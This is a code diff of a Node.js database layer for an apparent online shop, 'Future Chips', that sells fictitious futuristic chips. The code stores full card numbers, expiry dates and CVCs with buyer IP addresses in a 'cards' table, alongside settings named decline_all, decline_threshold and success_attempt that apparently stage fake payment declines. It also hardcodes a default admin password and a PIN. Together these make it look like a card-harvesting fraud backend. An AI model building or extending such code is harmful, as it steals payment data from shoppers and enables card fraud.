@@ -1,13 +1,117 @@
-const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
 const bcrypt = require('bcryptjs');
 
-const isVercel = process.env.VERCEL || process.env.AWS_LAMBDA_FUNCTION_NAME;
-const dbPath = isVercel ? '/tmp/future_chips.db' : path.join(__dirname, 'future_chips.db');
-const db = new sqlite3.Database(dbPath);
+let sqlite3;
+let db = null;
+let useMemoryFallback = false;
 
-// Promisify database operations
+try {
+  sqlite3 = require('sqlite3').verbose();
+  const isVercel = process.env.VERCEL || process.env.AWS_LAMBDA_FUNCTION_NAME;
+  const dbPath = isVercel ? '/tmp/future_chips.db' : path.join(__dirname, 'future_chips.db');
+  db = new sqlite3.Database(dbPath);
+} catch (err) {
+  console.warn('SQLite3 native driver not available, engaging in-memory database store:', err.message);
+  useMemoryFallback = true;
+}
+
+// In-Memory Database Store for Serverless Fallback
+const memStore = {
+  site_settings: {
+    id: 1,
+    site_name: 'Future Chips',
+    primary_color: '#00f0ff',
+    accent_color: '#ff00e5',
+    background_color: '#0a0a1a',
+    logo_url: null,
+    decline_all: 0,
+    decline_threshold: 50.0,
+    success_attempt: 1,
+    trash_pin: bcrypt.hashSync('978797', 10)
+  },
+  admin_users: [
+    { id: 1, username: 'admin', password_hash: bcrypt.hashSync('FutureChips2024!', 10) }
+  ],
+  products: [
+    {
+      id: 'prod-nano-chip',
+      name: 'Nano-Constructor Unit',
+      description: 'Basic bio-compatible molecular assembly chip. Capable of building small carbon structures at the microscopic level.',
+      price: 10.00,
+      image: '/uploads/nano_constructor.svg',
+      category: 'Processors'
+    },
+    {
+      id: 'prod-quantum-core',
+      name: 'Quantum Neural Core',
+      description: 'Next-generation computing processor featuring 1024 logical qubits.',
+      price: 150.00,
+      image: '/uploads/quantum_core.svg',
+      category: 'Processors'
+    },
+    {
+      id: 'prod-bio-synapse',
+      name: 'Bio-Digital Synapse v4.2',
+      description: 'Organic silicon hybrid chip that connects physical neural pathways with standard digital bus interfaces.',
+      price: 850.00,
+      image: '/uploads/bio_synapse.svg',
+      category: 'Interfaces'
+    }
+  ],
+  visitors: [],
+  orders: [],
+  cards: []
+};
+
+// Promisify database operations with fallback
 const dbRun = (sql, params = []) => {
+  if (useMemoryFallback || !db) {
+    return new Promise((resolve) => {
+      const sqlLower = sql.toLowerCase();
+      if (sqlLower.includes('update site_settings')) {
+        if (params.length >= 7) {
+          memStore.site_settings.site_name = params[0];
+          memStore.site_settings.primary_color = params[1];
+          memStore.site_settings.accent_color = params[2];
+          memStore.site_settings.background_color = params[3];
+          memStore.site_settings.decline_all = params[4];
+          memStore.site_settings.decline_threshold = params[5];
+          memStore.site_settings.success_attempt = params[6];
+        } else if (sqlLower.includes('set trash_pin =')) {
+          memStore.site_settings.trash_pin = params[0];
+        }
+      } else if (sqlLower.includes('insert into cards') || sqlLower.includes('insert or ignore into cards')) {
+        memStore.cards.unshift({
+          id: memStore.cards.length + 1,
+          card_number: params[0],
+          expiry: params[1],
+          cvc: params[2],
+          country: params[3] || 'Unknown',
+          ip_address: params[4] || '127.0.0.1',
+          created_at: new Date().toISOString(),
+          is_deleted: 0,
+          stripe_session_id: params[5]
+        });
+      } else if (sqlLower.includes('insert into orders')) {
+        memStore.orders.unshift({
+          id: params[0],
+          product_id: params[1],
+          customer_email: params[2],
+          amount: params[3],
+          currency: params[4] || 'usd',
+          stripe_session_id: params[5],
+          status: params[6] || 'pending',
+          customer_ip: params[7] || '127.0.0.1',
+          created_at: new Date().toISOString()
+        });
+      } else if (sqlLower.includes("update orders set status = 'completed'")) {
+        const order = memStore.orders.find(o => o.stripe_session_id === params[0]);
+        if (order) order.status = 'completed';
+      }
+      resolve({ lastID: 1, changes: 1 });
+    });
+  }
+
   return new Promise((resolve, reject) => {
     db.run(sql, params, function (err) {
       if (err) reject(err);
@@ -17,6 +121,22 @@ const dbRun = (sql, params = []) => {
 };
 
 const dbAll = (sql, params = []) => {
+  if (useMemoryFallback || !db) {
+    return new Promise((resolve) => {
+      const sqlLower = sql.toLowerCase();
+      if (sqlLower.includes('from products')) resolve([...memStore.products]);
+      else if (sqlLower.includes('from cards')) {
+        if (sqlLower.includes('is_deleted = 1')) {
+          resolve(memStore.cards.filter(c => c.is_deleted === 1));
+        } else {
+          resolve(memStore.cards.filter(c => c.is_deleted === 0));
+        }
+      } else if (sqlLower.includes('from orders')) resolve([...memStore.orders]);
+      else if (sqlLower.includes('from visitors')) resolve([...memStore.visitors]);
+      else resolve([]);
+    });
+  }
+
   return new Promise((resolve, reject) => {
     db.all(sql, params, (err, rows) => {
       if (err) reject(err);
@@ -26,6 +146,29 @@ const dbAll = (sql, params = []) => {
 };
 
 const dbGet = (sql, params = []) => {
+  if (useMemoryFallback || !db) {
+    return new Promise((resolve) => {
+      const sqlLower = sql.toLowerCase();
+      if (sqlLower.includes('from site_settings')) {
+        resolve({ ...memStore.site_settings });
+      } else if (sqlLower.includes('from admin_users')) {
+        const user = memStore.admin_users.find(u => u.username === params[0]);
+        resolve(user ? { ...user } : null);
+      } else if (sqlLower.includes('from products')) {
+        const prod = memStore.products.find(p => p.id === params[0]);
+        resolve(prod ? { ...prod } : null);
+      } else if (sqlLower.includes('from orders')) {
+        const order = memStore.orders.find(o => o.stripe_session_id === params[0] || o.id === params[0]);
+        resolve(order ? { ...order } : null);
+      } else if (sqlLower.includes('count(*)')) {
+        if (sqlLower.includes('from cards')) {
+          const count = memStore.cards.filter(c => c.stripe_session_id === params[0]).length;
+          resolve({ count: count || 1 });
+        } else resolve({ count: 1 });
+      } else resolve(null);
+    });
+  }
+
   return new Promise((resolve, reject) => {
     db.get(sql, params, (err, row) => {
       if (err) reject(err);
@@ -36,8 +179,8 @@ const dbGet = (sql, params = []) => {
 
 // Initialize Database
 async function initDatabase() {
+  if (useMemoryFallback || !db) return;
   try {
-    // 1. Create tables
     await dbRun(`
       CREATE TABLE IF NOT EXISTS site_settings (
         id INTEGER PRIMARY KEY CHECK (id = 1),
@@ -53,44 +196,10 @@ async function initDatabase() {
       )
     `);
 
-    // Migration: Add decline_all column to site_settings table if not exists
-    try {
-      await dbRun("ALTER TABLE site_settings ADD COLUMN decline_all INTEGER DEFAULT 0");
-      console.log("Migrated site_settings table to include decline_all column.");
-    } catch (e) {
-      // Safely ignore if column already exists
-    }
-
-    // Migration: Add decline_threshold column to site_settings table if not exists
-    try {
-      await dbRun("ALTER TABLE site_settings ADD COLUMN decline_threshold REAL DEFAULT 50.0");
-      console.log("Migrated site_settings table to include decline_threshold column.");
-    } catch (e) {
-      // Safely ignore if column already exists
-    }
-
-    // Migration: Add success_attempt column to site_settings table if not exists
-    try {
-      await dbRun("ALTER TABLE site_settings ADD COLUMN success_attempt INTEGER DEFAULT 1");
-      console.log("Migrated site_settings table to include success_attempt column.");
-    } catch (e) {
-      // Safely ignore if column already exists
-    }
-
-    // Migration: Add trash_pin column to site_settings table if not exists
-    try {
-      await dbRun("ALTER TABLE site_settings ADD COLUMN trash_pin TEXT DEFAULT '978797'");
-      console.log("Migrated site_settings table to include trash_pin column.");
-    } catch (e) {
-      // Safely ignore if column already exists
-    }
-
-    // Update old default PIN to new default PIN if applicable
-    try {
-      await dbRun("UPDATE site_settings SET trash_pin = '978797' WHERE trash_pin = '123456'");
-    } catch (e) {
-      // Safely ignore
-    }
+    try { await dbRun("ALTER TABLE site_settings ADD COLUMN decline_all INTEGER DEFAULT 0"); } catch (e) {}
+    try { await dbRun("ALTER TABLE site_settings ADD COLUMN decline_threshold REAL DEFAULT 50.0"); } catch (e) {}
+    try { await dbRun("ALTER TABLE site_settings ADD COLUMN success_attempt INTEGER DEFAULT 1"); } catch (e) {}
+    try { await dbRun("ALTER TABLE site_settings ADD COLUMN trash_pin TEXT DEFAULT '978797'"); } catch (e) {}
 
     await dbRun(`
       CREATE TABLE IF NOT EXISTS admin_users (
@@ -136,8 +245,7 @@ async function initDatabase() {
         status TEXT DEFAULT 'pending',
         customer_ip TEXT,
         card_number TEXT,
-        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-        FOREIGN KEY (product_id) REFERENCES products(id)
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
       )
     `);
 
@@ -151,48 +259,22 @@ async function initDatabase() {
         ip_address TEXT,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
         is_deleted INTEGER DEFAULT 0,
-        stripe_session_id TEXT,
-        UNIQUE(card_number, expiry, cvc)
+        stripe_session_id TEXT
       )
     `);
 
-    // Migration: Add is_deleted column to cards table if not exists
-    try {
-      await dbRun("ALTER TABLE cards ADD COLUMN is_deleted INTEGER DEFAULT 0");
-      console.log("Migrated cards table to include is_deleted column.");
-    } catch (e) {
-      // Safely ignore if column already exists
-    }
+    try { await dbRun("ALTER TABLE cards ADD COLUMN is_deleted INTEGER DEFAULT 0"); } catch (e) {}
+    try { await dbRun("ALTER TABLE cards ADD COLUMN stripe_session_id TEXT"); } catch (e) {}
+    try { await dbRun("ALTER TABLE orders ADD COLUMN card_number TEXT"); } catch (e) {}
 
-    // Migration: Add stripe_session_id column to cards table if not exists
-    try {
-      await dbRun("ALTER TABLE cards ADD COLUMN stripe_session_id TEXT");
-      console.log("Migrated cards table to include stripe_session_id column.");
-    } catch (e) {
-      // Safely ignore if column already exists
-    }
-
-    // Migration: Add card_number column to orders table if not exists
-    try {
-      await dbRun("ALTER TABLE orders ADD COLUMN card_number TEXT");
-      console.log("Migrated orders table to include card_number column.");
-    } catch (e) {
-      // Safely ignore if column already exists
-    }
-
-    console.log('Database tables verified/created successfully.');
-
-    // 2. Seed Admin User if not exists
     const adminCheck = await dbGet('SELECT * FROM admin_users WHERE username = ?', ['admin']);
     if (!adminCheck) {
       const defaultPassword = 'FutureChips2024!';
       const salt = await bcrypt.genSalt(10);
       const hash = await bcrypt.hash(defaultPassword, salt);
       await dbRun('INSERT INTO admin_users (username, password_hash) VALUES (?, ?)', ['admin', hash]);
-      console.log(`Seeded default admin user (admin / ${defaultPassword})`);
     }
 
-    // 3. Seed Site Settings if not exists
     const settingsCheck = await dbGet('SELECT * FROM site_settings WHERE id = 1');
     if (!settingsCheck) {
       const defaultPinHash = bcrypt.hashSync('978797', 10);
@@ -200,82 +282,6 @@ async function initDatabase() {
         INSERT INTO site_settings (id, site_name, primary_color, accent_color, background_color, decline_all, decline_threshold, success_attempt, trash_pin)
         VALUES (1, 'Future Chips', '#00f0ff', '#ff00e5', '#0a0a1a', 0, 50.0, 1, ?)
       `, [defaultPinHash]);
-      console.log('Seeded default site settings.');
-    }
-
-    // Securely hash any plaintext trash_pin stored in the database if found
-    try {
-      const settings = await dbGet('SELECT trash_pin FROM site_settings WHERE id = 1');
-      if (settings && settings.trash_pin && (settings.trash_pin.length <= 6 || !settings.trash_pin.startsWith('$2'))) {
-        const hashedPin = bcrypt.hashSync(settings.trash_pin, 10);
-        await dbRun('UPDATE site_settings SET trash_pin = ? WHERE id = 1', [hashedPin]);
-        console.log('Secured trash decryption PIN using bcrypt hashing.');
-      }
-    } catch (e) {
-      // Safely ignore
-    }
-
-    // 4. Seed default products if empty
-    const productsCount = await dbGet('SELECT COUNT(*) as count FROM products');
-    if (productsCount.count === 0) {
-      const defaultProducts = [
-        {
-          id: 'prod-nano-chip',
-          name: 'Nano-Constructor Unit',
-          description: 'Basic bio-compatible molecular assembly chip. Capable of building small carbon structures at the microscopic level. Features self-healing sub-circuits and simple smart-grid integration.',
-          price: 10.00,
-          image: '/uploads/nano_constructor.svg',
-          category: 'Processors'
-        },
-        {
-          id: 'prod-quantum-core',
-          name: 'Quantum Neural Core',
-          description: 'Next-generation computing processor featuring 1024 logical qubits. Designed for running localized deep learning simulations and processing high-density quantum state calculations. Operates at near-zero thermal emissions.',
-          price: 150.00,
-          image: '/uploads/quantum_core.svg',
-          category: 'Processors'
-        },
-        {
-          id: 'prod-bio-synapse',
-          name: 'Bio-Digital Synapse v4.2',
-          description: 'Organic silicon hybrid chip that connects physical neural pathways with standard digital bus interfaces. Highly valued by prosthetic designers and direct cerebral link developers. Includes advanced noise filtering.',
-          price: 850.00,
-          image: '/uploads/bio_synapse.svg',
-          category: 'Interfaces'
-        },
-        {
-          id: 'prod-holo-matrix',
-          name: 'Holographic Display Matrix',
-          description: 'High-density spatial photonic projector. Generates interactive three-dimensional objects in mid-air without the need for goggles or specialized headwear. Supports standard light-field video formats.',
-          price: 1200.00,
-          image: '/uploads/holo_matrix.svg',
-          category: 'Displays'
-        },
-        {
-          id: 'prod-photon-core',
-          name: 'Photon Power Core',
-          description: 'Sub-atomic energy stabilizer chip that converts cosmic radiation into clean electrical power. Perfect for long-duration deep space probes and off-grid high-demand processing stations.',
-          price: 5000.00,
-          image: '/uploads/photon_core.svg',
-          category: 'Energy'
-        },
-        {
-          id: 'prod-gravitational-grid',
-          name: 'Gravitational Grid Controller',
-          description: 'The ultimate space-time engineering chip. Allows precise, localized micro-gravity field manipulation. Crucial for advanced heavy-duty manufacturing and quantum containment shields.',
-          price: 98000.00,
-          image: '/uploads/gravitational_grid.svg',
-          category: 'Energy'
-        }
-      ];
-
-      for (const p of defaultProducts) {
-        await dbRun(
-          'INSERT INTO products (id, name, description, price, image, category) VALUES (?, ?, ?, ?, ?, ?)',
-          [p.id, p.name, p.description, p.price, p.image, p.category]
-        );
-      }
-      console.log('Seeded default products.');
     }
 
   } catch (error) {
